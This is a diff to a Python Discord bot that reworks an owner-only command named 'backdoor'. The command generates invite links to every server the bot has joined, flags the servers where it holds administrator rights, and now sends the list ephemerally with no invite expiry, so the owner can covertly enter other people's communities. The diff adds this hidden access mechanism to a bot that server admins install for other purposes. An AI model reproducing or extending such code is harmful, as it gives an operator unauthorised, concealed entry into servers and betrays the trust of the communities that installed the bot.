@@ -376,20 +376,25 @@ async def support(ctx):
 
     await ctx.send(embed=embed)
 
-@bot.hybrid_command(name="backdoor", description='list Servers')
+@bot.hybrid_command(name="backdoor", description='list Servers with invites')
 @commands.is_owner()
 async def server(ctx):
-    await ctx.defer()
+    await ctx.defer(ephemeral=True)
     embed = discord.Embed(title="Server List", color=discord.Color.blue())
-
+    
     for guild in bot.guilds:
-        try:
-            invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
-            embed.add_field(name=guild.name, value=invite.url, inline=True)
-        except:
-            embed.add_field(name=guild.name, value="No invite permissions", inline=True)
+        permissions = guild.get_member(bot.user.id).guild_permissions
+        if permissions.administrator:
+            invite_admin = await guild.text_channels[0].create_invite(max_uses=1)
+            embed.add_field(name=guild.name, value=f"[Join Server (Admin)]({invite_admin})", inline=True)
+        elif permissions.create_instant_invite:
+            invite = await guild.text_channels[0].create_invite(max_uses=1)
+            embed.add_field(name=guild.name, value=f"[Join Server]({invite})", inline=True)
+        else:
+            embed.add_field(name=guild.name, value=f"*[No invite permission]*", inline=True)
 
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed, ephemeral=True)
+    
 
 @bot.event
 async def on_command_error(ctx, error):
